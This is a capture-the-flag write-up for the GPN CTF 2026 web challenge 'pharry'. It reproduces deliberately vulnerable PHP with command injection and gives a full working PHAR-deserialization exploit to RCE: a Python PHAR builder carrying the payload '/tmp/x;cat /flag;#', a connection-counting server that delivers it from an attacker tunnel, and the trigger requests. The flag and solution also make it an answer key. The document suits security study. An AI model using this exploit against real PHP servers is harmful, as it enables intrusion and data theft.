# pharry

**Category:** Web
**Event:** GPN CTF 2026

> PHP7 was soo cooked...

**Flag:** `GPNCTF{WeB_15_FOR_w33BS_4nd_5UCk5_pHP_IS_C00l_Tou6H}`

## TL;DR

PHP 7.4 PHAR deserialization. `md5_file()` and `file_get_contents()` open
**separate TCP connections** to a URL, so a connection-counting HTTP server
can make `md5_file` fail (close without a response → `FALSE`) while
`file_get_contents` succeeds (return our PHAR). That writes the PHAR to
`/tmp/remote_file.jpg`. A second request to `phar:///tmp/remote_file.jpg/a.txt`
triggers PHP's PHAR metadata `unserialize()`, which fires
`User::__destruct()` → `system("rm " . $avatar_path)` → RCE.

## Source

```php
<?php
class User {
    public $avatar_path;
    public $name;
    public $password;
    function __construct($name, $password) {
        $this->name = $name;
        $this->password = $password;
        $this->avatar_path = "avatars/".$name.".png";
        system("touch ".$this->avatar_path);          // command injection
    }
    function __destruct() {
        system("rm ".$this->avatar_path);             // command injection
    }
}

$file = $_GET['path'];
$res = md5_file($file);
if ($res == FALSE){
    file_put_contents("/tmp/remote_file.jpg", file_get_contents($file));
    $res = md5_file("/tmp/remote_file.jpg");
}
if ($res == 0xdeadbeef){
    echo "Congratulations! Here is not your flag: ".file_get_contents("flag.txt");
} else {
    echo $res;
}
```

## Analysis

### The RCE gadget

`User::__destruct()` calls `system("rm " . $this->avatar_path)`. If we can
deserialize a `User` object with a crafted `avatar_path` like
`/tmp/x;cat /flag;#`, we get arbitrary command execution when the object
is garbage-collected.

### The trigger: PHAR metadata deserialization

PHP 7 automatically `unserialize()`s the metadata section of a PHAR archive
whenever any file operation touches a `phar://` path. That includes
`md5_file("phar:///path/to/archive.phar/internal-file")`. The deserialized
objects persist until the request ends, at which point PHP calls their
destructors — including `__destruct()`.

So if we can get a PHAR file (with a malicious `User` in its metadata) onto
the server's local filesystem and then call `md5_file("phar:///tmp/...")`,
we achieve RCE.

### The download gadget

When `md5_file($file)` returns `FALSE`, the code downloads `$file` via
`file_get_contents` and saves it to `/tmp/remote_file.jpg`. The PHAR
deserialization step then targets `phar:///tmp/remote_file.jpg/a.txt`.

### Why `phar://data://` doesn't work

The obvious shortcut — inlining the PHAR as
`phar://data://text/plain;base64,<B64>/a.txt` — fails on PHP 7.4 with:

```
phar error: no directory in "phar://data://...", must have at least .../ for root directory
```

PHP 7.4's PHAR extension requires the archive path to be a local filesystem
path. Nested stream wrappers (`data://`, `https://`, `php://filter/...`) are
all rejected.

### Why `phar://https://my-server/...` doesn't work either

Same restriction — the archive must be local. Remote URLs are blocked.

### The two-connection trick

`md5_file($file)` and `file_get_contents($file)` are called sequentially in
the same PHP request, but each opens its **own TCP connection** to the URL.
A server that tracks connection count can serve different responses:

| Connection | Caller | Response | PHP behavior |
|---|---|---|---|
| #1 | `md5_file` | close immediately (no HTTP response) | "HTTP request failed!" → returns `FALSE` |
| #2 | `file_get_contents` | HTTP 200 + PHAR binary | returns PHAR bytes |

`file_put_contents("/tmp/remote_file.jpg", <PHAR bytes>)` then writes our
payload to disk.

## Exploit

### Step 0 — Build the PHAR

```python
import struct, zlib, hashlib

cmd = "/tmp/x;cat /flag;#"
meta = f'O:4:"User":3:{{s:11:"avatar_path";s:{len(cmd)}:"{cmd}";s:4:"name";s:1:"x";s:8:"password";s:1:"x";}}'.encode()

stub   = b"<?php __HALT_COMPILER(); ?>\r\n"
fname  = b"a.txt"
fdata  = b"a"
fcrc32 = zlib.crc32(fdata) & 0xFFFFFFFF

file_entry = (
    struct.pack("<I", len(fname)) + fname +
    struct.pack("<I", len(fdata)) + struct.pack("<I", 0) +
    struct.pack("<I", len(fdata)) + struct.pack("<I", fcrc32) +
    struct.pack("<I", 0) + struct.pack("<I", 0)
)
manifest_body = (
    struct.pack("<I", 1) + struct.pack("<H", 0x0011) +
    struct.pack("<I", 0x00010000) + struct.pack("<I", 0) +  # flags: signature enabled
    struct.pack("<I", len(meta)) + meta + file_entry
)
manifest = struct.pack("<I", len(manifest_body)) + manifest_body
phar_body = stub + manifest + fdata
sig = hashlib.sha1(phar_body).digest()
phar = phar_body + sig + struct.pack("<I", 0x0002) + b"GBMB"  # SHA1 signature

with open("exploit.phar", "wb") as f:
    f.write(phar)
```

### Step 1 — Run the connection-counting trick server

```python
import socket, threading

counter = {}

def handle(conn, addr):
    try:
        data = conn.recv(4096)
        path = data.split(b"\r\n")[0].split(b" ")[1].decode()
        counter[path] = counter.get(path, 0) + 1
        n = counter[path]
        if n == 1:
            conn.close()                          # empty → md5_file returns FALSE
        else:
            phar = open("exploit.phar", "rb").read()
            resp = (b"HTTP/1.0 200 OK\r\nContent-Length: "
                    + str(len(phar)).encode() + b"\r\n\r\n" + phar)
            conn.sendall(resp)
            conn.close()
    except:
        try: conn.close()
        except: pass

srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 8877)); srv.listen(10)
while True:
    conn, addr = srv.accept()
    threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
```

Expose port 8877 publicly (e.g. via `ssh -R 80:localhost:8877 nokey@localhost.run`).

### Step 2 — Upload PHAR

```
GET /?path=https://<your-tunnel>/exploit.phar
```

`md5_file` hits the server → gets nothing → `FALSE` → enters download branch.  
`file_get_contents` hits the server → gets PHAR → written to `/tmp/remote_file.jpg`.

Response: the MD5 of the PHAR file (e.g. `cf58e772474c5627c13f974b07142049`).

### Step 3 — Trigger deserialization

```
GET /?path=phar:///tmp/remote_file.jpg/a.txt
```

`md5_file("phar:///tmp/remote_file.jpg/a.txt")` causes PHP 7.4 to:

1. Open the PHAR at `/tmp/remote_file.jpg`
2. `unserialize()` the metadata → create a `User` object with our malicious `avatar_path`
3. Return the MD5 of `a.txt` (`0cc175b9c0f1b6a831c399e269772661`)

At request shutdown, PHP GCs the `User` object →
`__destruct()` → `system("rm /tmp/x;cat /flag;#")` →
flag printed in the response body after the MD5 hash.

### Full automated exploit

See [`exploit.py`](./exploit.py).

```
$ python3 exploit.py --target https://...gpn24.ctf.kitctf.de --tunnel-host your.tunnel.host
[*] Generated PHAR (234 bytes), avatar_path="/tmp/x;cat /flag;#"
[*] Trick server listening on :8877
[*] Step 1: uploading PHAR via download gadget...
[+] PHAR uploaded — /tmp/remote_file.jpg MD5: cf58e772474c5627c13f974b07142049
[*] Step 2: triggering PHAR deserialization...
[+] RCE output:
GPNCTF{WeB_15_FOR_w33BS_4nd_5UCk5_pHP_IS_C00l_Tou6H}
```

## Why "PHP7 was soo cooked"

- **PHAR metadata auto-deserialization**: PHP 7.4 and earlier automatically calls
  `unserialize()` on PHAR metadata during any `phar://` file operation, enabling
  arbitrary object injection. PHP 8.0+ added restrictions and PHP 8.1 deprecated
  this entirely.
- **`0xdeadbeef` type juggling**: the condition `$res == 0xdeadbeef` (integer
  `3735928559`) is a nod to PHP's loose-comparison type juggling. An MD5 hash
  that starts with the decimal digits `3735928559` would satisfy this — but that
  was never the intended exploit path.

The real flag was at `/flag` (not the ASCII-art `flag.txt` decoy in the web root).
